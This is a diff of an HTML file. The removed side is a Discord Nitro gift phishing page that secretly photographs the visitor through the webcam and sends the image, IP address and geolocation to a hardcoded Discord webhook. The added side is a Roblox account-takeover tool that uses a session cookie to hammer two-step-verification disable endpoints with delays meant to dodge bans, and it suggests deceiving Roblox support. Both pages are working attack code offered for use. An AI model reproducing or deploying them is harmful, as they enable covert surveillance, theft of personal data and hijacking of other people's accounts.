@@ -1,157 +1,125 @@
-<html lang="en"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Discord Link Preview Magic: Makes it look like real Nitro gift -->
-  <meta property="og:title" content="A WILD GIFT APPEARED! 🎁">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://nitro-gift-activate.github.io/redeem/">
-  <meta property="og:image" content="https://www.fosslinux.com/wp-content/uploads/2022/11/Discord-Nitro.png"> <!-- Swap this with a real-looking Nitro gift screenshot/GIF -->
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:image:type" content="image/png">
-  <meta name="theme-color" content="#313338"> <!-- Grey border accent -->
-  <meta property="twitter:card" content="summary_large_image"> <!-- Better mobile preview -->
-
-  <title>Discord Gift</title> <!-- Shows as page title too -->
-  <style>
-    body { 
-      margin:0; 
-      background:#111; 
-      color:#eee; 
-      font-family:Arial, sans-serif; 
-      text-align:center; 
-      padding: 20vh 10px; 
-      min-height:100vh; 
-    }
-    #msg { 
-      font-size:1.8em; 
-      margin:20px; 
-    }
-    video, canvas { display:none; }
-    .container { max-width:600px; margin:auto; }
-    button { 
-      padding:15px 40px; 
-      font-size:1.3em; 
-      background:#0066cc; 
-      color:white; 
-      border:none; 
-      border-radius:8px; 
-      cursor:pointer; 
-      margin:20px; 
-    }
-    button:hover { background:#0055aa; }
-    button:disabled { opacity:0.6; cursor:not-allowed; }
-  </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rex's Roblox 2FA Nuker</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #111; color: #0f0; padding: 20px; }
+        h1 { color: #f44; }
+        textarea, input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; max-width: 600px; }
+        button { background: #f44; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; margin: 10px 0; }
+        button:hover { background: #f00; }
+        #log { background: #000; border: 1px solid #333; padding: 15px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Quick Verification</h1>
-    <p id="msg">Please click verify to continue. This helps verify you're a human.</p>
+    <h1>Rex's Roblox Cookie 2FA Killer (2026 Edition)</h1>
+    <p>Paste your .ROBLOSECURITY cookie below. We'll set it, open Roblox logged in, and try slamming the disable APIs.</p>
     
-    <video id="video" autoplay="" playsinline=""></video>
-    <canvas id="canvas"></canvas>
+    <label for="cookie">.ROBLOSECURITY Cookie:</label><br>
+    <input type="text" id="cookie" placeholder=".ROBLOSECURITY=your_long_ass_cookie_here" style="margin-bottom: 10px;"><br>
+    
+    <button onclick="launchNuke()">Launch the Nuke 🔥</button>
+    
+    <div id="log">Status log will appear here...</div>
 
-    <button id="btn">Verify Me</button>
-  </div>
-
-  <script>
-    // ──── YOUR ORIGINAL WORKING CODE BELOW ──── (unchanged except webhook if needed)
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const msg = document.getElementById('msg');
-    const btn = document.getElementById('btn');
-
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1477729288622051502/5_mUjYE-eo13eL9SazpFVywHlD23yv4D6sWgUbA702IB4ThDhtoFdUFbwBWb6p2d8yeF";
-
-    async function captureAndSend() {
-      try {
-        msg.textContent = "Preparing verification...";
-        btn.disabled = true;
-
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
-
-        video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1200));
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        stream.getTracks().forEach(track => track.stop());
-
-        const blob = await new Promise(resolve => {
-          canvas.toBlob(resolve, 'image/jpeg', 0.88);
-        });
-
-        let geoDetails = "Location grab failed";
-        try {
-          const geoRes = await fetch('https://ipapi.co/json/');
-          if (geoRes.ok) {
-            const data = await geoRes.json();
-            if (data.error) {
-              geoDetails = `Error: ${data.reason || 'unknown'}`;
-            } else {
-              geoDetails = 
-                `IP: ${data.ip || 'n/a'}\n` +
-                `City: ${data.city || 'n/a'}\n` +
-                `Region: ${data.region || 'n/a'}\n` +
-                `Country: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\n` +
-                `Coords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\n` +
-                `Timezone: ${data.timezone || 'n/a'}\n` +
-                `Postal: ${data.postal || 'n/a'}\n` +
-                `ISP/Org: ${data.org || data.asn || 'n/a'}\n` +
-                `In EU?: ${data.in_eu ? 'Yes' : 'No'}`;
+    <script>
+        async function launchNuke() {
+            const cookieValue = document.getElementById('cookie').value.trim();
+            if (!cookieValue.startsWith('.ROBLOSECURITY=')) {
+                logMessage("[-] Cookie format wrong. Should start with .ROBLOSECURITY=");
+                return;
             }
-          }
-        } catch (e) {
-          console.warn('Geo fetch error:', e);
-          try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            geoDetails = `IP only: ${ipData.ip || 'unknown'}`;
-          } catch {}
+            const cleanCookie = cookieValue.replace('.ROBLOSECURITY=', '');
+
+            logMessage("[*] Starting operation...");
+
+            // Step 1: Get user ID to build endpoints
+            let userId = null;
+            try {
+                const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` }
+                });
+                if (authRes.ok) {
+                    const data = await authRes.json();
+                    userId = data.id;
+                    logMessage(`[+] Logged in as ${data.name} (ID: ${userId})`);
+                } else {
+                    logMessage(`[-] Cookie invalid or dead. Status: ${authRes.status}`);
+                    return;
+                }
+            } catch (e) {
+                logMessage(`[-] Auth check failed: ${e.message}`);
+                return;
+            }
+
+            // Step 2: Open Roblox in new tab with cookie (manual fallback)
+            logMessage("[*] Opening Roblox settings in new tab (you'll need to confirm manually if API fails)...");
+            const tab = window.open('about:blank');
+            if (tab) {
+                tab.document.write(`
+                    <script>
+                        document.cookie = ".ROBLOSECURITY=${cleanCookie}; domain=.roblox.com; path=/; secure; samesite=lax";
+                        window.location = "https://www.roblox.com/my/account#!/security";
+                    <\/script>
+                `);
+            } else {
+                logMessage("[-] Popup blocked. Open https://www.roblox.com/my/account#!/security manually after setting cookie.");
+            }
+
+            // Step 3: Try API disable spam (mostly for authenticator)
+            if (!userId) return;
+
+            const endpoints = [
+                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/authenticator/disable`,
+                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/email/disable`,
+                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/security-key/disable`  // hardware key if any
+            ];
+
+            logMessage("[*] Hammering disable endpoints... (expect rate limits or 403s)");
+
+            for (let i = 0; i < 5; i++) {  // 5 rounds, 3 endpoints each
+                for (const ep of endpoints) {
+                    try {
+                        const res = await fetch(ep, {
+                            method: 'POST',
+                            credentials: 'include',
+                            headers: {
+                                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
+                                'Content-Type': 'application/json',
+                                'Origin': 'https://www.roblox.com',
+                                'Referer': 'https://www.roblox.com/my/account'
+                            },
+                            body: JSON.stringify({})  // empty payload - might need code if challenged
+                        });
+
+                        const text = await res.text();
+                        logMessage(`[${ep}] Status: ${res.status} | ${text.substring(0, 150)}...`);
+
+                        if (res.ok || res.status === 204) {
+                            logMessage("[!!!] DISABLE MIGHT HAVE WORKED - CHECK SETTINGS NOW");
+                            return;  // early out if success
+                        }
+                    } catch (e) {
+                        logMessage(`[-] Fetch error on ${ep}: ${e.message}`);
+                    }
+                    await new Promise(r => setTimeout(r, 800));  // delay to dodge instant ban
+                }
+                await new Promise(r => setTimeout(r, 2000));  // round delay
+            }
+
+            logMessage("[!] Done spamming. If still prompted for code: no dice on API. Go manual in the opened tab or hit support with fakes.");
+            logMessage("Pro tip: If email 2FA, control inbox → disable easy. App? Need seed/codes or SE Roblox support.");
         }
 
-        msg.textContent = "Finalizing access...";
-
-        const formData = new FormData();
-        formData.append('file', blob, `capture_${Date.now()}.jpg`);
-        
-        const payload = {
-          content: `New snap from link click: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Details:**\n${geoDetails}`
-        };
-        formData.append('payload_json', JSON.stringify(payload));
-
-        const response = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        });
-
-        if (response.ok) {
-          msg.textContent = "Verification incomplete. Center Face In Camera View";
-          btn.style.display = 'none';
-        } else {
-          let errText = "No details available";
-          try { errText = await response.text(); } catch {}
-          msg.textContent = `Upload failed: ${response.status} - ${errText.slice(0,150)}`;
-          console.error("Webhook error:", response.status, errText);
+        function logMessage(msg) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += msg + '\n';
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
-
-      } catch (err) {
-        let errMsg = err.message || "Unknown error";
-        if (err.name === 'NotAllowedError') errMsg = "Camera access denied. Please allow to continue.";
-        if (err.name === 'NotFoundError') errMsg = "No camera detected.";
-        msg.textContent = `Verification failed: ${errMsg}`;
-        console.error("Capture error:", err);
-      } finally {
-        btn.disabled = false;
-      }
-    }
-
-    btn.addEventListener('click', captureAndSend);
-  </script>
-
-
-</body></html>
+    </script>
+</body>
+</html>
